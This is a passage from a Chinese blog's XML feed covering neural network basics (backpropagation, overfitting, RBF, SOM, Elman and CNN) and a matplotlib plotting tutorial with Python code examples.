class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05556em;">γ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.05556em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.424826em;vertical-align:-0.43581800000000004em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">h</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9890079999999999em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.01968em;">l</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">h</span><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span></span>学习率<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>η</mi><mo>∈</mo><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\eta \in(0,1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">η</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，控制迭代中的更新步长，太大容易震荡，太小则收敛过慢。其中wθ与vγ的学习率不一定相等。</p></li></ul><h2 id="bp算法流程"><a class="markdownIt-Anchor" href="#bp算法流程"></a> BP算法流程</h2><ul><li>算法的工作流程：</li></ul><p><img src="/images/pasted-99.png" alt="BP算法流程" /></p><h2 id="标准bp算法与累计bp算法"><a class="markdownIt-Anchor" href="#标准bp算法与累计bp算法"></a> 标准BP算法与累计BP算法</h2><ul><li>主要目标：最小化训练集D上的累计误差 。前面算法更新规则是基于单个Ek推导的，也称作“标准BP算法”。若使用基于累计误差最小化的更新规则，成为累计误差逆传播算法（accumulated errror backpropagation）。两者都很常用：</li></ul><table><thead><tr><th>算法</th><th>说明</th></tr></thead><tbody><tr><td>标准BP算法</td><td>1、每次针对单个训练样例更新权值与阈值；<br>2、参数更新频繁，不同样例可以抵消，需要多次迭代</td></tr><tr><td>累计BP算法</td><td>1、其优化目标是最小化整个训练集上的累计误差；<br>2、读取整个训练集一遍才对参数进行更新，参数更新频率较低</td></tr></tbody></table><ul><li>累计BP算法更新频率低，防止不同样例导致训练出现抵消的现象。在很多任务中，累计误差下降到一定程度后，进一步下降会非常缓慢，这是标准BP算法往往会获得较好的解，尤其当训练集非常大时效果更明显。</li></ul><h2 id="缓解过拟合"><a class="markdownIt-Anchor" href="#缓解过拟合"></a> 缓解过拟合</h2><ul><li>主要策略</li><li><strong>早停early stopping</strong>：<ul><li>将训练数据分为训练集和验证集。训练集计算梯度和更新，验证估计误差。<ol><li>若训练误差连续a轮的变化小于b,则停止训练</li><li>使用验证集：若训练误差降低，验证误差升高，则停止训练。</li></ol></li><li>返回具有最小验证误差的链接权重和阈值。</li></ul></li><li>正则化<ul><li>regularization在误差目标函数中，增加一项描述网络复杂度：例如连接权和阈值的平方和</li><li>误差目标函数改为： ， 用于对经验误差和网络复杂度进行折中。偏好比较小的连接权和阈值，使网络输出更“光滑”</li></ul></li></ul><h2 id="全局最小与局部极小"><a class="markdownIt-Anchor" href="#全局最小与局部极小"></a> 全局最小与局部极小</h2><p><img src="/images/pasted-100.png" alt="最小与极小" /></p><ul><li><p>神经网络的训练过程可看作一个参数寻优过程：在参数空间中，寻找一组最优参数使得误差最小</p></li><li><p>特点：存在多个“局部极小”；只有一个“全局最小”</p></li><li><p>常用策略跳出局部极小</p><ul><li>不同参数进行初始化</li><li>模拟退火（simulated annealing）以一定概率接收比当前解更差的结果，每部迭代中，接受次优解的概率随时间推移而降低。</li><li>随机梯度下降计算梯度时增加随机因素，即使陷入局部极小也有机会跳出继续搜索。</li><li>遗传算法（genetic algorithms）</li></ul></li></ul><h1 id="其他常见神经网络模型"><a class="markdownIt-Anchor" href="#其他常见神经网络模型"></a> 其他常见神经网络模型</h1><h2 id="rbf网络"><a class="markdownIt-Anchor" href="#rbf网络"></a> RBF网络</h2><ul><li>RBF（Radial Basis Function，径向基函数）网络在分类任务中除BP之外最常用的一种</li></ul><h3 id="单隐层前馈神经网络"><a class="markdownIt-Anchor" href="#单隐层前馈神经网络"></a> 单隐层前馈神经网络</h3><ul><li>使用径向基函数作为隐层神经元激活函数ρ： ，定义为样本x到数据中心ci之间欧式距离的单调函数，常用高斯径向基函数。 。ci表示隐层神经元对应的中心、wi表示权重。</li><li>输出层是隐层神经元输出的线性组合</li></ul><h3 id="训练rbf网络"><a class="markdownIt-Anchor" href="#训练rbf网络"></a> 训练RBF网络：</h3><ul><li>确定神经元中心ci，常用的方式包括随机采样、聚类等</li><li>利用BP算法等确定参数wi和βi。</li></ul><h2 id="art网络"><a class="markdownIt-Anchor" href="#art网络"></a> ART网络</h2><ul><li>ART（Adaptive Resonance Theory，自适应谐振理论）竞争学习的代表，是一种常用的无监督学习策略。该策略网络输出神经元相互竞争，每一时刻仅有一个竞争获胜的神经元被激活。其他神经元被抑制。包含比较层、识别层、识别阈值和重置模块。</li></ul><h2 id="som网络"><a class="markdownIt-Anchor" href="#som网络"></a> SOM网络</h2><ul><li>SOM（Self-Organizing Map，自组织映射）网络是最常用的聚类方法之一：<ul><li>竞争型的无监督神经网络</li><li>将高维数据映射到低维空间，并保持输入数据在高维空间的拓扑结构。即将高维空间中相似的样本点映射到网络输出层中邻近神经元</li><li>每个神经元拥有一个权向量</li><li>目标：为每个输出层神经元找到合适的权向量以保持拓扑结构</li></ul></li><li>训练<ul><li>网络接收输入样本后，将会确定输出层的“获胜”神经元（“胜者通吃”）</li><li>获胜神经元的权向量将向当前输入样本移动</li></ul></li></ul><h2 id="级联相关网络构造性神经网络的代表"><a class="markdownIt-Anchor" href="#级联相关网络构造性神经网络的代表"></a> 级联相关网络：“构造性”神经网络的代表</h2><ul><li>构造性神经网络：将网络结构也当做学习的目标，并在训练过程中找到最符合的网络结构。是结构自适应网络的重要代表。</li><li>训练<ul><li>开始时只有输入层和输出层</li><li>级联（Cascade）：新的隐层节点逐渐加入，从而创建起层级结构</li><li>相关（Correlation）：最大化新节点的输出与网络误差之间的相关性</li></ul></li></ul><h2 id="elman网络递归神经网络的代表"><a class="markdownIt-Anchor" href="#elman网络递归神经网络的代表"></a> Elman网络：递归神经网络的代表</h2><ul><li>网络可以有环形结构，可让使一些神经元的输出反馈回来最为输入</li><li>t 时刻网络的输出状态： 由 t 时刻的输入状态和 t-1时刻的网络状态共同决定</li><li>Elman网络是最常用的递归神经网络之一</li><li>结构与前馈神经网络很相似，但隐层神经元的输出被反馈回来</li><li>使用推广的BP算法训练</li></ul><h2 id="bolyzmann机基于能量的模型的代表"><a class="markdownIt-Anchor" href="#bolyzmann机基于能量的模型的代表"></a> Bolyzmann机：”基于能量的模型”的代表</h2><h1 id="深度学习"><a class="markdownIt-Anchor" href="#深度学习"></a> 深度学习</h1><h2 id="卷积神经网络cnn"><a class="markdownIt-Anchor" href="#卷积神经网络cnn"></a> 卷积神经网络CNN</h2><p><img src="/images/pasted-101.png" alt="深度学习" /></p><ul><li><p>每个卷积层包含多个特征映射，每个特征映射是一个由多个神经元构成的“平面”，通过一种卷积滤波器提取输入的一种特征</p></li><li><p>采样层亦称“汇合层”，其作用是基于局部相关性原理进行亚采样，从而在减少数据量的同事保留有用信息</p></li><li><p>连接层就是传统神经网络对隐层与输出层的全连接</p></li><li><p>典型的深度学习模型就是很深层的神经网络</p></li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib</title>
      <link href="/2020/08/20/matplotlib/"/>
      <url>/2020/08/20/matplotlib/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>matplotlib基本使用汇总</p></blockquote><a id="more"></a><h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><ul><li>Matplotlib是Python的一个模块，是一个绘图库。</li><li><a href="https://matplotlib.org">官方网址</a></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import matplotlib</span><br><span class="line">print(matplotlib.__version__)</span><br><span class="line">print(matplotlib.get_backend())</span><br></pre></td></tr></table></figure><h2 id="输入类型"><a class="markdownIt-Anchor" href="#输入类型"></a> 输入类型</h2><ul><li>所有绘图函数都接收np.array或np.ma.masked_array作为输入。</li></ul><h2 id="matplotlib-inline"><a class="markdownIt-Anchor" href="#matplotlib-inline"></a> ％matplotlib inline</h2><ul><li>如果使用Jupyter Notebook，命令％matplotlib inline确保图形将被描绘在文档内部而不是独立窗口</li></ul><h1 id="pyplotplt"><a class="markdownIt-Anchor" href="#pyplotplt"></a> pyplot.plt()</h1><h2 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h2><ul><li><code>plt.plot(x, y, format_string,[label,color,alpha=1,linestyle,linewidth], **kwargs)</code><ul><li>x : X轴数据，列表或数组，可选</li><li>y : Y轴数据，列表或数组</li><li>format_string: 控制曲线的格式字符串，可选</li><li>**kwargs : 第二组或更多(x,y,format_string)</li></ul></li><li>当绘制多条曲线时，各条曲线的x不能省略</li></ul><h2 id="format_string线型风格字符"><a class="markdownIt-Anchor" href="#format_string线型风格字符"></a> format_string线型风格字符</h2><h3 id="linestyle"><a class="markdownIt-Anchor" href="#linestyle"></a> linestyle</h3><table><thead><tr><th>线型风格字符</th><th>说明</th></tr></thead><tbody><tr><td>‘-’</td><td>solid line style (实线)</td></tr><tr><td>‘–’</td><td>dashed line style (虚线)</td></tr><tr><td>‘-.’</td><td>dash-dot line style (点划线)</td></tr><tr><td>‘:’</td><td>dotted line style (点线)</td></tr></tbody></table><p><img src="/images/pasted-85.png" alt="线型风格" /></p><h3 id="marker标记字符"><a class="markdownIt-Anchor" href="#marker标记字符"></a> marker标记字符</h3><table><thead><tr><th>标记字符</th><th>说明</th></tr></thead><tbody><tr><td>‘.’</td><td>point marker</td></tr><tr><td>‘,’</td><td>pixel marker</td></tr><tr><td>‘o’</td><td>circle marker</td></tr><tr><td>‘v’</td><td>triangle_down marker</td></tr><tr><td>‘^’</td><td>triangle_up marker</td></tr><tr><td>‘&lt;’</td><td>triangle_left marker</td></tr><tr><td>‘&gt;’</td><td>triangle_right marker</td></tr><tr><td>‘1’</td><td>tri_down marker</td></tr><tr><td>‘2’</td><td>tri_up marker</td></tr><tr><td>‘3’</td><td>tri_left marker</td></tr><tr><td>‘4’</td><td>tri_right marker</td></tr><tr><td>‘s’</td><td>square marker</td></tr><tr><td>‘p’</td><td>pentagon marker</td></tr><tr><td>‘*’</td><td>star marker</td></tr><tr><td>‘h’</td><td>hexagon1 marker</td></tr><tr><td>‘H’</td><td>hexagon2 marker</td></tr><tr><td>‘+’</td><td>plus marker</td></tr><tr><td>‘x’</td><td>x marker</td></tr><tr><td>‘D’</td><td>diamond marker</td></tr><tr><td>‘d’</td><td>thin_diamond marker</td></tr><tr><td>‘|’</td><td>vline marker</td></tr></tbody></table><p><img src="/images/pasted-86.png" alt="填充" /><br /><img src="/images/pasted-87.png" alt="非填充" /></p><h3 id="颜色字符"><a class="markdownIt-Anchor" href="#颜色字符"></a> 颜色字符</h3><table><thead><tr><th>颜色字符</th><th>说明</th></tr></thead><tbody><tr><td>‘b’</td><td>blue (蓝色)</td></tr><tr><td>‘g’</td><td>green (绿色)</td></tr><tr><td>‘r’</td><td>red (红色)</td></tr><tr><td>‘c’</td><td>cyan (青绿色)</td></tr><tr><td>‘m’</td><td>magenta (洋红色)</td></tr><tr><td>‘y’</td><td>yellow (黄色)</td></tr><tr><td>‘k’</td><td>black (黑色)</td></tr><tr><td>‘w’</td><td>白色</td></tr><tr><td>‘#008000’</td><td>RGB某颜色</td></tr><tr><td>‘0.8’</td><td>灰度值字符串</td></tr></tbody></table><ul><li>风格字符、标记字符和颜色字符可以组合使用</li></ul><h2 id="轴标签"><a class="markdownIt-Anchor" href="#轴标签"></a> 轴标签</h2><ul><li>ylabel和xlabel</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">celsius_values = [<span class="number">25.6</span>, <span class="number">24.1</span>, <span class="number">26.7</span>, <span class="number">28.3</span>, <span class="number">27.5</span>, <span class="number">30.5</span>, <span class="number">32.8</span>, <span class="number">33.1</span>]</span><br><span class="line">plt.plot(days, celsius_values)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Day&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Degrees Celsius&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="轴的范围"><a class="markdownIt-Anchor" href="#轴的范围"></a> 轴的范围</h2><ul><li>axis查看和定义轴的范围</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">celsius_min = [<span class="number">19.6</span>, <span class="number">24.1</span>, <span class="number">26.7</span>, <span class="number">28.3</span>, <span class="number">27.5</span>, <span class="number">30.5</span>, <span class="number">32.8</span>, <span class="number">33.1</span>]</span><br><span class="line">celsius_max = [<span class="number">24.8</span>, <span class="number">28.9</span>, <span class="number">31.3</span>, <span class="number">33.0</span>, <span class="number">34.9</span>, <span class="number">35.6</span>, <span class="number">38.4</span>, <span class="number">39.2</span>]</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Day&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Degrees Celsius&#x27;</span>)</span><br><span class="line">plt.plot(days, celsius_min,days, celsius_min, <span class="string">&quot;oy&quot;</span>,</span><br><span class="line">         days, celsius_max,days, celsius_max, <span class="string">&quot;or&quot;</span>)</span><br><span class="line">print(plt.axis())</span><br><span class="line">xmin, xmax, ymin, ymax = <span class="number">0</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">45</span></span><br><span class="line">print(xmin, xmax, ymin, ymax)</span><br><span class="line">plt.axis([xmin, xmax, ymin, ymax])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="线型风格"><a class="markdownIt-Anchor" href="#线型风格"></a> 线型风格</h2><ul><li><code>linestyle</code>可以设置更多的线型风格</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">X = np.linspace(<span class="number">0</span>, <span class="number">2</span> * np.pi, <span class="number">50</span>, endpoint=<span class="literal">True</span>)</span><br><span class="line">F3 = <span class="number">0.3</span> * np.sin(X)</span><br><span class="line">plt.plot(X, F3, color=<span class="string">&quot;green&quot;</span>, linewidth=<span class="number">2</span>, linestyle=(<span class="number">0</span>,(<span class="number">5</span>,<span class="number">1</span>)))</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-88.png" alt="线型风格" /></p><h2 id="区域着色"><a class="markdownIt-Anchor" href="#区域着色"></a> 区域着色</h2><ul><li><p><code>fill_between(x, y1, y2=0, where=None, interpolate=False, **kwargs)</code></p><ul><li><code>x</code> <code>x</code>数据的N长度数组</li><li><code>y1</code> <code>y</code>数据的N长度数组（或标量）</li><li><code>y2</code> <code>y</code>数据的N长度数组（或标量）</li><li><code>where</code> 如果是<code>None</code>，则默认在所有位置之间填充。 如果不是<code>None</code>，则它是一个N长度的numpy布尔数组，并且填充只会在<code>where == True</code>的区域上发生。</li><li><code>interpolate</code> 如果为<code>True</code>，则在两条线之间进行插值以找到精确的交点。 否则，填充区域的起点和终点将仅出现在x数组中的显式值上。</li><li><code>kwargs</code> 传递给PolyCollection</li></ul></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">n = <span class="number">256</span></span><br><span class="line">X = np.linspace(-np.pi,np.pi,n,endpoint=<span class="literal">True</span>)</span><br><span class="line">Y = np.sin(<span class="number">2</span>*X)</span><br><span class="line">plt.plot (X, Y, color=<span class="string">&#x27;blue&#x27;</span>, alpha=<span class="number">1.00</span>)</span><br><span class="line">plt.fill_between(X, <span class="number">0</span>, Y, color=<span class="string">&#x27;blue&#x27;</span>, alpha=<span class="number">.1</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-89.png" alt="区域着色" /></p><h2 id="spines"><a class="markdownIt-Anchor" href="#spines"></a> Spines</h2><ul><li><p>matplotlib中的Spine是连接轴刻度标记并指示数据区域边界的线。</p></li><li><p>设置坐标轴位置，plt.gca()返回figure上的当前的axes实例。</p></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">X = np.linspace(<span class="number">-2</span> * np.pi, <span class="number">2</span> * np.pi, <span class="number">70</span>, endpoint=<span class="literal">True</span>)</span><br><span class="line">F1 = np.sin(<span class="number">2</span>* X)</span><br><span class="line"><span class="comment"># get the current axes, creating them if necessary:</span></span><br><span class="line">ax = plt.gca()</span><br><span class="line"><span class="comment"># making the top and right spine invisible: </span></span><br><span class="line">ax.spines[<span class="string">&#x27;top&#x27;</span>].set_color(<span class="string">&#x27;none&#x27;</span>) <span class="comment"># 设置不可见</span></span><br><span class="line">ax.spines[<span class="string">&#x27;right&#x27;</span>].set_color(<span class="string">&#x27;none&#x27;</span>) <span class="comment"># 设置不可见 </span></span><br><span class="line"><span class="comment"># moving bottom spine up to y=0 position:</span></span><br><span class="line">ax.xaxis.set_ticks_position(<span class="string">&#x27;bottom&#x27;</span>) <span class="comment"># 刻度位置</span></span><br><span class="line">ax.spines[<span class="string">&#x27;bottom&#x27;</span>].set_position((<span class="string">&#x27;data&#x27;</span>,<span class="number">0</span>)) <span class="comment"># 轴位置</span></span><br><span class="line"><span class="comment"># moving left spine to the right to position x == 0:</span></span><br><span class="line">ax.yaxis.set_ticks_position(<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line">ax.spines[<span class="string">&#x27;left&#x27;</span>].set_position((<span class="string">&#x27;data&#x27;</span>,<span class="number">0</span>))</span><br><span class="line">plt.plot(X, F1)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="坐标轴刻度"><a class="markdownIt-Anchor" href="#坐标轴刻度"></a> 坐标轴刻度</h2><ul><li>使用xticks或yticks可获取或设置当前的刻度位置和标签</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">ax = plt.gca()</span><br><span class="line"><span class="comment"># 获取</span></span><br><span class="line">locs, labels = plt.xticks()</span><br><span class="line">locs, labels = plt.yticks()</span><br><span class="line"><span class="comment"># 设置位置</span></span><br><span class="line">plt.xticks( np.arange(<span class="number">10</span>) )</span><br><span class="line"><span class="comment"># 设置位置和标签</span></span><br><span class="line">plt.xticks( np.arange(<span class="number">4</span>), </span><br><span class="line">           (<span class="string">&#x27;Berlin&#x27;</span>, <span class="string">&#x27;London&#x27;</span>, <span class="string">&#x27;Paris&#x27;</span>, <span class="string">&#x27;Toronto&#x27;</span>) )</span><br><span class="line"><span class="comment"># LaTeX表示法设置标签</span></span><br><span class="line">plt.xticks( [<span class="number">-6.28</span>, <span class="number">-3.14</span>, <span class="number">3.14</span>, <span class="number">6.28</span>],[<span class="string">r&#x27;$-2\pi$&#x27;</span>, <span class="string">r&#x27;$-\pi$&#x27;</span>, <span class="string">r&#x27;$+\pi$&#x27;</span>, <span class="string">r&#x27;$+2\pi$&#x27;</span>])</span><br></pre></td></tr></table></figure><ul><li>调整刻度标签</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> xtick <span class="keyword">in</span> ax.get_xticklabels():</span><br><span class="line">    print(xtick.get_text()) <span class="comment"># 获取text</span></span><br><span class="line">    xtick.set_fontsize(<span class="number">18</span>)</span><br><span class="line">    xtick.set_bbox(dict(facecolor=<span class="string">&#x27;white&#x27;</span>, edgecolor=<span class="string">&#x27;None&#x27;</span>, alpha=<span class="number">0.7</span> ))</span><br></pre></td></tr></table></figure><h2 id="添加图例"><a class="markdownIt-Anchor" href="#添加图例"></a> 添加图例</h2><ul><li>图例（Legend）常在地图中使用。 Legend用来描述地图的图形语言或符号系统。</li><li><code>legend(*args, **kwargs)</code>Matplotlib可以使用图例来解释图中函数或值的代表的含义。</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">x = np.linspace(<span class="number">0</span>, <span class="number">25</span>, <span class="number">1000</span>);y1 = np.sin(x);y2 = np.cos(x);</span><br><span class="line">plt.plot(x, y1, <span class="string">&#x27;-b&#x27;</span>, label=<span class="string">&#x27;sine&#x27;</span>)  <span class="comment"># 显示plot标签</span></span><br><span class="line">plt.plot(x, y2, <span class="string">&#x27;-r&#x27;</span>, label=<span class="string">&#x27;cosine&#x27;</span>)  <span class="comment"># 显示plot标签</span></span><br><span class="line">plt.legend(loc=<span class="string">&#x27;upper left&#x27;</span>) <span class="comment"># 位置参数</span></span><br><span class="line">plt.ylim(<span class="number">-1.5</span>, <span class="number">2.0</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><ul><li>在许多情况下，我们不知道在plot之前结果可能是什么样子。 例如，legend将使线条的重要部分蒙上阴影。 如果不知道数据的显示情况，最好使用’best’作为loc的参数。 Matplotlib将自动尝试为图例找到最佳位置</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">plt.legend(loc=<span class="string">&#x27;best&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="标题"><a class="markdownIt-Anchor" href="#标题"></a> 标题</h2><ul><li><code>pyplot.title(label, fontdict=None, loc=None, pad=None, **kwargs)</code></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">plt.title(<span class="string">&#x27;Change of Celsius Degrees&#x27;</span>, size=<span class="number">11</span>)</span><br></pre></td></tr></table></figure><h2 id="标注"><a class="markdownIt-Anchor" href="#标注"></a> 标注</h2><ul><li><code>annotate(label,xy,xytext,textcoords,fontsize,arrowprops)</code>用于标出某一点在图中的位置<ul><li>xy： coordinates of the arrow tip</li><li>xytext： coordinates of the text location</li></ul></li></ul><table><thead><tr><th>xycoords字符串值</th><th>坐标系统</th></tr></thead><tbody><tr><td>‘figure points’</td><td>Points from the lower left of the figure</td></tr><tr><td>‘figure pixels’</td><td>Pixels from the lower left of the figure</td></tr><tr><td>‘figure fraction’</td><td>Fraction of figure from lower left</td></tr><tr><td>‘axes points’</td><td>Points from lower left corner of axes</td></tr><tr><td>‘axes pixels’</td><td>Pixels from lower left corner of axes</td></tr><tr><td>‘axes fraction’</td><td>Fraction of axes from lower left</td></tr><tr><td>‘data’</td><td>Use the coordinate system of the object being annotated (default)</td></tr><tr><td>‘polar’</td><td>(theta, r) if not native ‘data’ coordinates</td></tr></tbody></table><table><thead><tr><th>arrowprops key</th><th>描述</th></tr></thead><tbody><tr><td>width</td><td>The width of the arrow in points</td></tr><tr><td>headwidth</td><td>The width of the base of the arrow head in points</td></tr><tr><td>headlength</td><td>The length of the arrow head in points</td></tr><tr><td>shrink</td><td>Fraction of total length to shrink from both ends</td></tr><tr><td>**kwargs</td><td>any key for matplotlib.patches.Polygon, e.g., facecolor</td></tr></tbody></table><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">X = np.linspace(<span class="number">-2</span> * np.pi, <span class="number">3</span> * np.pi, <span class="number">70</span>, endpoint=<span class="literal">True</span>)</span><br><span class="line">F1 = np.sin(X)</span><br><span class="line">F2 = <span class="number">3</span> * np.sin(X)</span><br><span class="line">ax = plt.gca()</span><br><span class="line">plt.xticks( [<span class="number">-6.28</span>, <span class="number">-3.14</span>, <span class="number">3.14</span>, <span class="number">6.28</span>],</span><br><span class="line">        [<span class="string">r&#x27;$-2\pi$&#x27;</span>, <span class="string">r&#x27;$-\pi$&#x27;</span>, <span class="string">r&#x27;$+\pi$&#x27;</span>, <span class="string">r&#x27;$+2\pi$&#x27;</span>])</span><br><span class="line">plt.yticks([<span class="number">-3</span>, <span class="number">-1</span>, <span class="number">0</span>, +<span 